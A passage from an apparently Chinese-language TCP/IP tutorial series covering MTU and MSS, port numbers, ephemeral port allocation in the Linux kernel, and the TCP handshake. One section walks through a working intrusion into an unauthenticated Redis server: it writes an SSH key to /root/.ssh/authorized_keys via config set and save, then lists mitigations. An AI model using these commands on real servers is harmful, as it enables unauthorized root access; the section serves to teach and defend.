32792 \u0026lt;mss 1460,nop,wscale 7\u0026gt; 0.100 \u0026gt; S. 0:0(0) ack 1 \u0026lt;mss 1460,nop,wscale 7\u0026gt; 0.200 \u0026lt; . 1:1(0) ack 1 win 257 0.200 accept(3, ..., ...) = 4 // 至此三次握手，相关初始化完成  // 发送第一个数据包 +0.2 write(4, ..., 1460) = 1460 // 断言内核会发送 1460 大小的数据包出来 +0.0 \u0026gt; P. 1:1461(1460) ack 1  // 发送 ICMP 错误报文，告知包太大, 需要分片 +0.01 \u0026lt; icmp unreachable frag_needed mtu 1200 [1:1461(1460)]  // TCP 立马选择对方告知的较小 MTU 计算自己的 MSS，重发此包 +.0 \u0026gt; . 1:1161(1160) ack 1 +0.0\u0026gt; P. 1161:1461(300) ack 1  // 确认所有的数据 +0.1 \u0026lt; . 1:1(0) ack 1461 win 257  +0 `sleep 1000000`   其中在发送了 1460 大小的数据以后，这第一个数据包在 IP 层设置了不分段，之后收到一个 ICMP 告知的报文过大错误\n运行抓包如下图\n  1 ~ 3：三次握手\n  4：发送长度为 1460 的数据，这个数据包设置了不允许分片Don't fragment: Set\n  5：发送端收到 ICMP 包，告知包太大需要分片，下一个分片的大小按照 MTU=1200 来计算\n  6：TCP 为了避免底层分片立刻拆包重发数据包，这次包大小为 1200 - 40 = 1160\n  7：发送端发送剩下的 300 字节（1460 - 1160）\n  8：确认所有的数据\n  整个过程如下图所示\n因为有 MTU 的存在，TCP 每次发包的大小也限制了，这就是下面要介绍的 MSS。\nTCP 最大段大小（Max Segment Size，MSS） TCP 为了避免被发送方分片，会主动把数据分割成小段再交给网络层，最大的分段大小称之为 MSS（Max Segment Size）。\n1  MSS = MTU - IP header头大小 - TCP 头大小   这样一个 MSS 的数据恰好能装进一个 MTU 而不用分片。\n在以太网中 TCP 的 MSS = 1500（MTU） - 20（IP 头大小） - 20（TCP 头大小）= 1460\n我们来抓一个包来实际看一下，下面是下载一个 png 图片的 http 请求包 当三次握手建立一个 TCP 连接时，通信的双方会在 SYN 报文里说明自己允许的最大段大小。\n可以看到 TCP 的包体数据大小为 1448，因为TCP 头部里包含了 12 字节的选项（Options）字段，头部大小从之前的 20 字节变为了 32 字节，所以 TCP 包体大小变为了：1500（以太网 MTU） - 20（IP 固定表头大小） - 20（TCP 固定表头大小） - 12（TCP 表头选项） = 1448\n为什么有时候抓包看到的单个数据包大于 MTU 写一个简单的代码来测试一下。\n在服务端（10.211.55.10）使用nc -l 9999 启动一个 tcp 服务器\n1  nc -l 9999   在一台机器（10.211.55.5）记为 c1，使用 tcpdump 抓包开启抓包\n1  sudo tcpdump -i any port 9999 -nn   执行下面的 java 代码，往服务端 c2 写 100KB 的数据\n1 2 3 4 5 6  Socket socket = new Socket(); socket.connect(new InetSocketAddress(\u0026#34;c2\u0026#34;, 9999)); OutputStream out = socket.getOutputStream(); byte[] bytes= new byte[100 * 1024]; out.write(bytes); System.in.read();   抓包文件显示如下\n可以看到包的长度达到了 14k，远超 MTU 的大小，为什么可以这样呢？\n这就要说到 TSO（TCP Segment Offload）特性了，TSO 特性是指由网卡代替 CPU 实现 packet 的分段和合并，节省系统资源，因此 TCP 可以抓到超过 MTU 的包，但是不是真正传输的单个包会超过链路的 MTU。\n使用ethtool -k可以查看这个特性是否打开，比如ethtool -k eth0输出如下\nTCP 套接字选项 TCP_MAXSEG TCP 有一个 socket 选项 TCP_MAXSEG，可以用来设置此次连接的 MSS，如果设置了这个选项，则 MSS 不能超过这个值。我们来看看实际的代码，还是以 echo server 为例，在 bind 之前调用 setsockopt 设置 socket 选项。完整的代码见：github.com/arthur-zhan…\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  int main(int argc, char *argv[]) {  int port = atoi(argv[1]);  int mss = atoi(argv[2]);   // ...  int tcp_maxseg = mss;  socklen_t tcp_maxseg_len = sizeof(tcp_maxseg);   // 设置 TCP_MAXSEG 选项  if ((err = setsockopt(server_fd, IPPROTO_TCP, TCP_MAXSEG, \u0026amp;tcp_maxseg, tcp_maxseg_len)) \u0026lt; 0) {  error_quit(\u0026#34;set TCP_MAXSEG failed, code: %d\\n\u0026#34;, err);  }   if (bind(server_fd, (struct sockaddr *)\u0026amp;serv_addr, sizeof(serv_addr)) \u0026lt; 0) {  error_quit(\u0026#34;could not bind socket\u0026#34;);  }   if (listen(server_fd, 128) \u0026lt; 0) {  error_quit(\u0026#34;Could not listen on socket\\n\u0026#34;);  }   printf(\u0026#34;server start, listening on %d\\n\u0026#34;, port);   while (1) {  socklen_t client_len = sizeof(cli_addr);   if ((client_fd = accept(server_fd, (struct sockaddr *)\u0026amp;cli_addr, \u0026amp;client_len)) \u0026lt; 0) {  error_quit(\u0026#34;could not establish new connection\\n\u0026#34;);  }   while (1) {  int read = recv(client_fd, buf, BUFFER_SIZE, 0);  if (!read) break;  if (read \u0026lt; 0) error_quit(\u0026#34;read failed\\n\u0026#34;);  if (send(client_fd, buf, read, 0) \u0026lt; 0) error_quit(\u0026#34;write failed\\n\u0026#34;);  }  } }   编译运行上面的代码。\n1 2  gcc test.c -o echo-server ./echo-server 9999 100   在使用 nc 或者 telnet 连接这个 9999 端口服务，使用 tcpdump 查看抓包结果如下。\n可以看到经过代码的设置，三次握手中的 MSS 已经从 1460 变为了 100。那 MSS 允许的范围是多少呢？如果设置一个很小的 MSS，比如 50，会出现 setsockopt 失败的情况，如下所示。\n1 2  ./echo-server 9999 50 set TCP_MAXSEG failed, code: -1   经过快速的二分法，很快就可以定位出来 setsockopt 合法的范围 88~32767，接下来我们来看看内核对这一部分是如何处理的。内核处理 setsockopt 的函数在 do_tcp_setsockopt@net/ipv4/tcp.c，\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  static int do_tcp_setsockopt(struct sock *sk, int level, \tint optname, char __user *optval, unsigned int optlen) {   switch (optname) {  case TCP_MAXSEG: \t/* Values greater than interface MTU won\u0026#39;t take effect. However * at the point when this call is done we typically don\u0026#39;t yet * know which interface is going to be used */ \tif (val \u0026lt; TCP_MIN_MSS || val \u0026gt; MAX_TCP_WINDOW) { \terr = -EINVAL; // -22 \tbreak; \t} \ttp-\u0026gt;rx_opt.user_mss = val; \tbreak;  } }   常量 TCP_MIN_MSS 的值为 88，常量 MAX_TCP_WINDOW 的值为 32768，因此不在 88~32767 直接的 MSS 值会设置失败。\n 为什么 TCP_MAXSEG 的下界是 88？\n 这是因为 TCP 头包含了 20 字节的固定长度和 40 字节的可选参数，所以 TCP 头的最大长度是 60，IP 头最大长度也是 60。\n为了保证在 TCP 头占满 60 字节、IP 头占满 60 字节的情况下，至少还能发 8 字节的数据，MSS 至少要等于 (MAX_IP_HDR + MAX_TCP_HDR + MIN_IP_FRAG) - (MIN_IP_HDR + MIN_TCP_HDR) = (60+60+8) - (20+20) = 88 字节。\n那 MSS 设置一个比较大的值，比如 30000，实际 MSS 是 30000 吗？\n执行前面的程序，使用 setsockopt 将 MSS 设置为 30000，如下所示。\n1  ./echo-server 9999 30000   再次在使用 nc 或者 telnet 连接这个 9999 端口服务，使用 tcpdump 查看抓包结果如下。\n可以看到这时 MSS 没有变为 30000，依旧是 1460。这是因为调用 setsockopt 时并不知道后面会使用哪个网卡。后面真正发送 SYN 时，会根据设备的 MTU 重新计算最终的 MSS。\n小结 这篇文章主要介绍了几个比较基础的概念，IP 数据包长度在超过链路的 MTU 时在发送之前需要分片，而 TCP 层为了 IP 层不用分片主动将包切割成 MSS 大小。\n作业题 1、TCP/IP 协议中，MSS 和 MTU 分别工作在哪一层？\n2、在 MTU=1500 字节的以太网中，TCP 报文的最大载荷为多少字节？\n7、繁忙的贸易港口 —— 聊聊端口号 这篇文章我们来聊聊端口号这个老朋友。端口号的英文叫Port，原意是\u0026quot;港口，口岸\u0026quot;的意思，作为繁忙的进出口转运货物，跟端口号在计算机中的含义非常接近。\n分层结构中每一层都有一个唯一标识，比如链路层的 MAC 地址，IP 层的 IP 地址，传输层是用端口号。\nTCP 用两字节的整数来表示端口，一台主机最大允许 65536 个端口号的。TCP 首部中端口号如下图黄色高亮部分。\n如果把 ip 地址比作一间房子，端口就是出入这间房子的门。房子一般只有几个门，但是一台主机端口最多可以有 65536 个。\n有了 IP 协议，数据包可以顺利的被传输到对应 IP 地址的主机，当主机收到一个数据包时，应该把这个数据包交给哪个应用程序进行处理呢？这台主机可能运行多个应用程序，比如处理 HTTP 请求的 web 服务器 Nginx，Redis 服务器， 读写 MySQL 服务器的客户端等。\n传输层就是用端口号来区分同一个主机上不同的应用程序的。操作系统为有需要的进程分配端口号，当目标主机收到数据包以后，会根据数据报文首部的目标端口号将数据发送到对应端口的进程。\n主动发起的客户端进程也需要开启端口，会把自己的端口放在首部的源端口（source port）字段中，以便对方知道要把数据回复给谁。\n端口号分类 端口号被划分成以下 3 种类型：\n 熟知端口号（well-known port） 已登记的端口（registered port） 临时端口号（ephemeral port）   熟知端口号（well-known port）\n熟知端口号由专门的机构由 IANA 分配和控制，范围为 0~1023。为了能让客户端能随时找到自己，服务端程序的端口必须要是固定的。很多熟知端口号已经被用就分配给了特定的应用，比如 HTTP 使用 80端口，HTTPS 使用 443 端口，ssh 使用 22 端口。 访问百度http://www.baidu.com/，其实就是向百度服务器之一（163.177.151.110）的 80 端口发起请求，curl -v http://www.baidu.com/抓包结果如下\n1 2 3 4 5 6 7 8  20:12:32.336962 IP 10.211.55.10.39438 \u0026gt; 163.177.151.110.80: Flags [S], seq 2171375522, win 29200, options [mss 1460,sackOK,TS val 346956173 ecr 0,nop,wscale 7], length 0 20:12:32.373834 IP 163.177.151.110.80 \u0026gt; 10.211.55.10.39438: Flags [S.], seq 3304042876, ack 2171375523, win 32768, options [mss 1460,wscale 1,nop], length 0 20:12:32.373948 IP 10.211.55.10.39438 \u0026gt; 163.177.151.110.80: Flags [.], ack 1, win 229, length 0 20:12:32.374290 IP 10.211.55.10.39438 \u0026gt; 163.177.151.110.80: Flags [P.], seq 1:78, ack 1, win 229, length 77 GET / HTTP/1.1 Host: www.baidu.com User-Agent: curl/7.64.1 Accept: */*   在 Linux 上，如果你想监听这些端口需要 Root 权限，为的就是这些熟知端口不被普通的用户进程占用，防止某些普通用户实现恶意程序（比如伪造 ssh 监听 22 端口）来获取敏感信息。熟知端口也被称为保留端口。\n 已登记的端口（registered port）\n已登记的端口不受 IANA 控制，不过由 IANA 登记并提供它们的使用情况清单。它的范围为 1024～49151。\n为什么是 49151 这样一个魔数？ 其实是取的端口号最大值 65536 的 3/4 减 1 （49151 = 65536 * 0.75 - 1）。可以看到已登记的端口占用了大约 75% 端口号的范围。\n已登记的端口常见的端口号有：\n MySQL：3306 Redis：6379 MongoDB：27017  熟知端口号和已登记的端口都可以在 iana 的官网 查到\n临时端口号（ephemeral port） 如果应用程序没有调用 bind() 函数将 socket 绑定到特定的端口上，那么 TCP 和 UDP 会为该 socket 分配一个唯一的临时端口。IANA 将 49152～65535 范围的端口称为临时端口（ephemeral port）或动态端口（dynamic port），也称为私有端口（private port），这些端口可供本地应用程序临时分配端口使用。\n不同的操作系统实现会选择不同的范围分配临时端口，在 Linux 上能分配的端口范围由 /proc/sys/net/ipv4/ip_local_port_range 变量决定，一般 Linux 内核端口范围为 32768~60999\n1 2  cat /proc/sys/net/ipv4/ip_local_port_range 32768 60999   在需要主动发起大量连接的服务器上（比如网络爬虫、正向代理）可以调整 ip_local_port_range 的值，允许更多的可用端口。\n端口相关的命令 如何查看对方端口是否打开 使用 nc 和 telnet 这两个命令可以非常方便的查看到对方端口是否打开或者网络是否可达，比如查看 10.211.55.12 机器的 6379 端口是否打开可以使用\n1 2 3 4 5 6 7 8  telnet 10.211.55.12 6379 Trying 10.211.55.12... Connected to 10.211.55.12. Escape character is \u0026#39;^]\u0026#39;.   nc -v 10.211.55.12 6379 Ncat: Connected to 10.211.55.12:6379   这两个命令我后面会有独立的内容来介绍，现在先有一个印象。\n如果对端端口没有打开，会发生什么呢？比如 10.211.55.12 的6380 端口没有打开，使用 telnet 和 nc 命令会出现 \u0026ldquo;Connection refused\u0026rdquo; 错误\n1 2 3 4 5 6  telnet 10.211.55.12 6380 Trying 10.211.55.12... telnet: connect to address 10.211.55.12: Connection refused   nc -v 10.211.55.12 6380 Ncat: Connection refused   如何查看端口被什么进程监听占用 比如查看 22 端口被谁占用，常见的可以使用 lsof 和 netstat 两种方法\n第一种方法：使用 netstat\n1  sudo netstat -ltpn | grep :22   第二种方法：使用 lsof 因为在 linux 上一切皆文件，TCP socket 连接也是一个 fd。因此使用 lsof 也可以\n1  sudo lsof -n -P -i:22   其中 -n 表示不将 IP 转换为 hostname，-P 表示不将 port number 转换为 service name，-i:port 表示端口号为 22 的进程\n可以看到 22 端口被进程号为 1333 的 sshd 进程监听\n反过来，如何查看进程监听或者打开了哪些端口呢？\n如何查看进程监听的端口号 还是以 sshd 为例，先用ps -ef | grep sshd 找到 sshd 的进程号，这里为 1333\n第一种方法：使用 netstat\n1  sudo netstat -atpn | grep 1333   第二种方法：使用 lsof\n1  sudo lsof -n -P -p 1333 | grep TCP   第三种方法奇技淫巧：/proc/pid\n在 linux 上有一个神奇的目录/proc，每个进程启动以后会生成这样一个目录，比如我们用nc -4 -l 8080快速启动一个 tcp 的服务器，使用 ps 找到进程 id\n1 2 3 4  ps -ef | grep \u0026#34;nc -4 -l 8080\u0026#34; | grep -v grep  UID PID PPID C STIME TTY TIME CMD ya 19196 15191 0 00:33 pts/6 00:00:00 nc -4 -l 8080   然后 cd 进 /proc/19196 (备注 19196 是 nc 命令的进程号），执行ls -l看到如下输出\n里面有一个很有意思的文件和目录，cwd 表示 nc 命令是在哪个工作目录执行的。fd 目录表示进程打开的所有的文件，cd 到那个目录\nfd 为 0，1，2的分别表示标准输入stdin(0)、标准输出stdout(1)、错误输出stderr(2)。fd 为 3 表示 nc 监听的套接字 fd，后面跟了一个神奇的数字 25597827，这个数字表示 socket 的 inode 号，我们可以通过这个 inode 号来找改 socket 的信息。\nTCP 的连接信息会在这里显示cat /proc/net/tcp\n可以找到 inode 为 25597827 的套接字。其中 local_address 为 00000000:1F90，rem_address 为 00000000:0000，表示四元组（0.0.0.0:8080, 0.0.0.0:0)，state 为 0A，表示 TCP_LISTEN 状态。\n利用端口进行网络攻击 道路千万条，安全第一条。暴露不合理，运维两行泪。\n把本来应该是内网或本机调用的服务端口暴露到公网是极其危险的事情，比如之前 2015 年很多 Redis 服务器遭受到了攻击，方法正是利用了暴露在公网的 Redis 端口进行入侵系统。\n它的原理是利用了不需要密码登录的 redis，清空 redis 数据库后写入他自己的 ssh 登录公钥，然后将redis数据库备份为 /root/.ssh/authotrized_keys。 这就成功地将自己的公钥写入到 .ssh 的 authotrized_keys，无需密码直接 root 登录被黑的主机。\n下面我们来演示一个以 root 权限运行的 redis 服务器是怎么被黑的。\n场景：一台 ip 为 10.211.55.12（我的一台 Centos7 虚拟机）的 6379 端口对外暴露端口。首先尝试登录，发现需要输入密码\n1 2 3  ssh root@10.211.55.12 root@10.211.55.12\u0026#39;s password: Permission denied, please try again.   切换到 root 用户 1、下载解压 Redis 3.0 的代码：\n1 2  wget https://codeload.github.com/antirez/redis/zip/3.0 unzip 3.0   2、编译 redis\n1 2  cd redis-3.0 make   3、运行 redis 服务器，不出意外，redis 服务器就启动起来了。\n1 2  cd src ./redis-server   执行 netstat\n1  sudo netstat -ltpn | grep 6379   可以看到 redis 服务器默认监听 0.0.0.0:6379，表示允许任意来源的连接 6379 端口，可以在另外一台机器使用 telnet 或者 nc 访问此端口，如果成功连接，可以输入 ping 看是否返回 pong。\n1 2 3  nc c4 6379 ping +PONG   注意 Centos7 上默认启用了防火墙，会禁止访问某些端口，可以下面的方式禁用。\n1  sudo systemctl stop firewalld.service   4、客户端使用 ssh-keygen 生成公钥，不停按 enter，不出意外马上在~/.ssh生成了目录生成了公私钥文件\n1 2 3 4 5 6  ssh-keygen  ll ~/.ssh ya@c2 ~$ ll .ssh -rw-------. 1 ya ya 1.7K 4月 14 03:00 id_rsa -rw-r--r--. 1 ya ya 387 4月 14 03:00 id_rsa.pub   5、将客户端公钥写入到文件 foo.txt 中以便后面写入到 redis，其实是生成一个头尾都包含两个空行的公钥文件\n1  (echo -e \u0026#34;\\n\\n\u0026#34;; cat ~/.ssh/id_rsa.pub; echo -e \u0026#34;\\n\\n\u0026#34;) \u0026gt; foo.txt   6、先清空 Redis 存储所有的内容，将 foo.txt 文件内容写入到某个 key 中，这里为 crackit，随后调用 redis-cli 登录 redis 调用 config 命令设置文件 redis 的 dir 目录和把 rdb 文件的名字dbfilename 设置为 authorized_keys。\n1 2 3 4 5 6 7 8 9  redis-cli -h 10.211.55.12 echo flushall cat foo.txt | redis-cli -h 10.211.55.12 -x set crackit  // 登录 Redis redis-cli -h 10.211.55.12  config set dir /root/.ssh  config set dbfilename \u0026#34;authorized_keys\u0026#34;   7、执行 save 将 crackit 内容 落盘\n1  save   8、尝试登录\n1  ssh root@10.211.55.12   我们来看一下，服务器 10.211.55.12 机器上 /root/.ssh/authorized_keys 的内容，可以看到 authorized_keys 文件正是我们客户端机器的公钥文件\n利用这个漏洞有几个前提条件\n Redis 绑定 0.0.0.0 允许所有来源的 TCP 连接，且没有设置密码 这完全是作死，因为就算不能入侵你的系统，也可以修改 Redis 中缓存的内容。不过 Redis 的设计者们一开始就认为不会有人这么做，因为把 Redis 放在一个信任的内网环境运行才是正道啊。 Redis 没有设置密码或密码过于简单 大部分开发都没有意识到 Redis 没有密码是一个大问题，要么是一个很简单的密码要么没有密码，Redis 的处理能力非常强，auth这种命令可以一秒钟处理几万次以上，简单的密码很容易被暴力破解 redis-server 进程使用 root 用户启动 不用 root 用户启动也可以完成刷新 authorized_keys 的功能，但是不能登陆，因为非 root 用户 authorized_keys 的权限要求是 600 才可以登录，但是可以覆盖破坏系统的文件。 没有禁用 save、config、flushall 这些高危操作 在正式服务器上这些高危操作都应该禁用或者进行重命名。这样就算登录你你的 Redis，也没有办法修改 Redis 的配置和修改服务器上的文件。  解决办法  首要原则：不暴露服务到公网 让 redis 运行在相对可信任的内网环境 设置高强度密码 使用高强度密码增加暴力破解的难度 禁止 root 用户启动 redis 业务服务永远不要使用 root 权限启动 禁用或者重命名高危命令 禁用或者重命名 save、config、flushall 等这些高危命令，就算成功登陆了 Redis，也就只能折腾你的 redis，不能取得系统的权限进行更危险的操作 升级高版本的 Redis 出现如此严重的问题，Redis 从 3.2 版本加入了 protected mode， 在没有指定 bind 地址或者没有开启密码设置的情况下，只能通过回环地址本地访问，如果尝试远程访问 redis，会提示以下错误：  -DENIED Redis is running in protected mode because protected mode is enabled, no bind address was specified, no authentication password is requested to clients. In this mode connections are only accepted from the loopback interface. If you want to connect from external computers to Redis you may adopt one of the following solutions: 1) Just disable protected mode sending the command \u0026lsquo;CONFIG SET protected-mode no\u0026rsquo; from the loopback interface by connecting to Redis from the same host the server is running, however MAKE SURE Redis is not publicly accessible from internet if you do so. Use CONFIG REWRITE to make this change permanent. 2) Alternatively you can just disable the protected mode by editing the Redis configuration file, and setting the protected mode option to \u0026rsquo;no\u0026rsquo;, and then restarting the server. 3) If you started the server manually just for testing, restart it with the \u0026lsquo;\u0026ndash;protected-mode no\u0026rsquo; option. 4) Setup a bind address or an authentication password. NOTE: You only need to do one of the above things in order for the server to start accepting connections from the outside.\n小结 这篇文章讲解了端口号背后的细节，我为你准备了思维导图：\n作业题 1、小于（）的 TCP/UDP 端口号已保留与现有服务一一对应，此数字以上的端口号可自由分配？\n A、80 B、1024 C、8080 D、65525  2、下列TCP端口号中不属于熟知端口号的是（）\n A、21 B、23 C、80 D、3210  3、关于网络端口号，以下哪个说法是正确的（）\n A、通过 netstat 命令，可以查看进程监听端口的情况 B、https 协议默认端口号是 8081 C、ssh 默认端口号是 80 D、一般认为，0-80 之间的端口号为周知端口号(Well Known Ports)  8、临时端口号是如何分配的 我们知道客户端主动发起请求 connect 时，操作系统会为它分配一个临时端口（ephemeral port）。在 linux 上 这个端口的取值范围由 /proc/sys/net/ipv4/ip_local_port_range 文件的值决定，在我的 CentOS 机器上，临时端口的范围是 32768~60999。\n有两种典型的使用方式会生成临时端口：\n 调用 bind 函数不指定端口 调用 connect 函数  先来看 bind 调用的例子，故意注释掉端口的赋值，完整的代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  int main(void) {  int listenfd;  socklen_t clilen;  struct sockaddr_in cliaddr, servaddr;  listenfd = socket(AF_INET, SOCK_STREAM, 0); bzero(\u0026amp;servaddr, sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl (INADDR_ANY); // 这里故意注释掉端口的赋值 // servaddr.sin_port = htons (9090); bind(listenfd, (struct sockaddr *)\u0026amp;servaddr, sizeof(servaddr)); listen(listenfd, 5); clilen = sizeof(cliaddr); accept(listenfd, (struct sockaddr *)\u0026amp;cliaddr, \u0026amp;clilen); sleep(-1); return 1; }   编译执行上面的代码，使用 netstat 可以看到 linux 自动为其分配了一个临时的端口 40843。\n1 2  Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:40843 0.0.0.0:* LISTEN 21608/./a.out   再来看第二个例子客户端 connect，使用 nc 或者 telnet 访问本地或远程的服务时，都会自动分配一个临时端口号。比如执行 nc localhost 8080 访问本机的 web 服务器，随后使用 netstat 查看连接状态，可以看到分配了临时端口号 37778。\n1 2  Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:37778 127.0.0.1:8080 ESTABLISHED 22126/nc   临时端口号分配的源码分析 接下来的内容以 connect 为例，linux 内核版本是 3.10.0。核心的代码在 net/ipv4/inet_hashtables.c 中，为了方便我做了部分精简。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  int __inet_hash_connect(struct sock *sk, u32 port_offset) {  int low; // 临时端口号的下界  int high; // 临时端口号的上界  static u32 hint; // 使用静态变量保存的递增值，减少 offset 冲突的可能性  // port_offset 是根据源地址、目的地址、目标端口计算出的哈希值  u32 offset = hint + port_offset;  int port;   // 读取 /proc/sys/net/ipv4/ip_local_port_range 的临时端号的上界和下界  inet_get_local_port_range(net, \u0026amp;low, \u0026amp;high);   // remaining 是临时端口号可分配值的范围  int remaining = (high - low) + 1;   /* By starting with offset being an even number, * we tend to leave about 50% of ports for other uses, * like bind(0). */  offset \u0026amp;= ~1; // 将最后一位置为 0   int i;  // 从 0 开始遍历，查找未被占用的端口号  for (i = 0; i \u0026lt; remaining; i++) {  // 保证 port 的范围是在 low~high 之间  port = low + (i + offset) % remaining;  // 检查端口号是否属于保留端口号  if (inet_is_reserved_local_port(port))  continue;  // 接下来检查端口是否被占用、等逻辑  if (all_ok) {  goto ok;  }   }  ok:  // 下次 connect 时 hint 递增，减少端口号冲突的概率  hint += (i + 2) \u0026amp; ~1; }   其中传入的 port_offset 的计算逻辑是在 net/core/secure_seq.c 的 secure_ipv4_port_ephemeral 方法中实现的，代码如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  u32 secure_ipv4_port_ephemeral(__be32 saddr, __be32 daddr, __be16 dport) { \tu32 hash[MD5_DIGEST_WORDS];  \tnet_secret_init(); \thash[0] = (__force u32)saddr; // 源地址 \thash[1] = (__force u32)daddr; // 目标地址 \thash[2] = (__force u32)dport ^ net_secret[14]; // 目标端口号 \thash[3] = net_secret[15];  \tmd5_transform(hash, net_secret); // 计算 MD5值  \treturn hash[0]; }   因为此时还没有源端口，这个函数使用源地址、目标地址、目标端口号这三个元素进行 MD5 运算得到一个 offset 值，通过同一组源地址、目标地址、目标端口号计算出的 offset 值相等，这也是为什么需要加入地址 hint 的原因，否则使对同一个目标端口服务同时进行请求时，第一次 for 循环计算出来的端口都是一样的。加入了递增的 hint 以后，就可以避免这种情况了。\n内核调试 以一次实际的计算为例，经过调试 linux 内核，在某一次 telnet localhost 2000 过程中，分配到的临时端口号是 48968，如下所示。\n1 2  Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:48968 127.0.0.1:2000 ESTABLISHED 16475/telnet   下面看下计算的过程。\n 根据 ip_local_port_range 的值，low=32768，high=48948，remaining=28232 在我的虚拟机中，除了测试的代码没有跑其它的应用，分配端口号不会冲突，面代码中的 for 循环只会循环一次，i 值等于 0。 在此次测试中 hint=32，port_offset=266836801  1 2 3 4 5 6 7 8  // offset = 32 + 266836801 = 0xfe79b61 u32 offset = hint + port_offset;  // offset = 0xfe79b60 offset \u0026amp;= ~1; // 将最后一位置为 0 // port = 32768 + (0 + 0xfe79b60) % 28232 // port = 32768 + 16200 = 48968 port = low + (i + offset) % remaining;   临时端口号分配完了会发生什么 如果短时间内大量 connect，耗尽了所有临时端口号会发生什么？我们来实测一下。\n使用 sysctl 修改 ip_local_port_range 的范围，只允许分配一个端口 50001，如下所示。\n1  sudo sysctl -w net.ipv4.ip_local_port_range=\u0026#34;50001 50001\u0026#34;   使用 nc 或者 telnet 等工具发起 TCP 连接，这里使用nc -4 localhost 22，使用 netstat 查看当前连接信息，可以看到分配的临时端口为 50001，如下所示。\n1 2  Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:50001 127.0.0.1:22 ESTABLISHED 18605/nc   再次执行 nc 发起连接，可以看到这次失败了，如下所示。\n1 2 3  nc -4 localhost 22  Ncat: Cannot assign requested address.   使用 strace 查看 nc 命令系统调用。\n1  strace nc -4 localhost 22   系统调用如下所示。\n1 2 3 4 5  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3 fcntl(3, F_GETFL) = 0x2 (flags O_RDWR) fcntl(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0 connect(3, {sa_family=AF_INET, sin_port=htons(22), sin_addr=inet_addr(\u0026#34;127.0.0.1\u0026#34;)}, 16) = -1 EADDRNOTAVAIL (Cannot assign requested address) ...   可以看到 connect 调用返回了 EADDRNOTAVAIL 错误。使用 golang 的代码和结果如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;net\u0026#34; \t\u0026#34;time\u0026#34; )  func main() { \t// 仅使用 ipv4 \t_, err := net.Dial(\u0026#34;tcp4\u0026#34;, \u0026#34;localhost:22\u0026#34;) \tif err != nil { \tfmt.Println(err) \t} \ttime.Sleep(time.Minute * 10) }   编译运行上面的 go 代码结果如下所示。\n1  dial tcp4 127.0.0.1:22: connect: cannot assign requested address   9、（实验）TCP 恋爱史第一步 —— 从三次握手说起 这篇文章我们来详细了解一下三次握手，很多人会说三次握手这么简单，还需要讲吗？其实三次握手背后有很多值得我们思考和深究的地方。\n三次握手 一次经典的三次握手的过程如下图所示： 三次握手的最重要的是交换彼此的 ISN（初始序列号），序列号怎么计算来的可以暂时不用深究，我们需要重点掌握的是包交互过程中序列号变化的原理。\n1、客户端发送的一个段是 SYN 报文，这个报文只有 SYN 标记被置位。 SYN 报文不携带数据，但是它占用一个序号，下次发送数据序列号要加一。客户端会随机选择一个数字作为初始序列号（ISN）\n1  为什么 SYN 段不携带数据却要消耗一个序列号呢？   这是一个好问题，不占用序列号的段是不需要确认的（都没有内容确认个啥），比如 ACK 段。SYN 段需要对方的确认，需要占用一个序列号。后面讲到四次挥手那里 FIN 包也有同样的情况，在那里我们会用一个图来详细说明。\n关于这一点，可以记住如下的规则：\n1  凡是消耗序列号的 TCP 报文段，一定需要对端确认。如果这个段没有收到确认，会一直重传直到达到指定的次数为止。   2、服务端收到客户端的 SYN 段以后，将 SYN 和 ACK 标记都置位\nSYN 标记的作用与步骤 1 中的一样，也是同步服务端生成的初始序列号。ACK 用来告知发送端之前发送的 SYN 段已经收到了，「确认号」字段指定了发送端下次发送段的序号，这里等于客户端 ISN 加一。 与前面类似 SYN + ACK 端虽然没有携带数据，但是因为 SYN 段需要被确认，所以它也要消耗一个序列号。\n3、客户端发送三次握手最后一个 ACK 段，这个 ACK 段用来确认收到了服务端发送的 SYN 段。因为这个 ACK 段不携带任何数据，且不需要再被确认，这个 ACK 段不消耗任何序列号。\n一个最简单的三次握手过程的wireshark 抓包如下： 在 wireshark 中 SEQ 和 ACK 号都是绝对序号，一般而言这些序号都较大，为了便于分析，我们一般都会显示相对序列号，在 wireshark 的\u0026quot;Edit-\u0026gt;Preferences-\u0026gt;Protocols-\u0026gt;TCP\u0026quot;菜单里可以进行设置显示相对序列号，\n除了交换彼此的初始序列号，三次握手的另一个重要作用是交换一些辅助信息，比如最大段大小（MSS）、窗口大小（Win）、窗口缩放因子（WS)、是否支持选择确认（SACK_PERM）等，这些都会在后面的文章中重点介绍。\n初始序列号（Initial Sequence Number, ISN） 初始的序列号并非从 0 开始，通信双方各自生成，一般情况下两端生成的序列号不会相同。生成的算法是 ISN 随时间而变化，会递增的分配给后续的 TCP 连接的 ISN。\n一个建议的算法是设计一个假的时钟，每 4 微妙对 ISN 加一，溢出 2^32 以后回到 0，这个算法使得猜测 ISN 变得非常困难。\n1  ISN 能设置成一个固定值呢？   答案是不能，TCP 连接四元组（源 IP、源端口号、目标 IP、目标端口号）唯一确定，所以就算所有的连接 ISN 都是一个固定的值，连接之间也是不会互相干扰的。但是会有几个严重的问题\n1、出于安全性考虑。如果被知道了连接的ISN，很容易构造一个在对方窗口内的序列号，源 IP 和源端口号都很容易伪造，这样一来就可以伪造 RST 包，将连接强制关闭掉了。如果采用动态增长的 ISN，要想构造一个在对方窗口内的序列号难度就大很多了。\n2、因为开启 SO_REUSEADDR 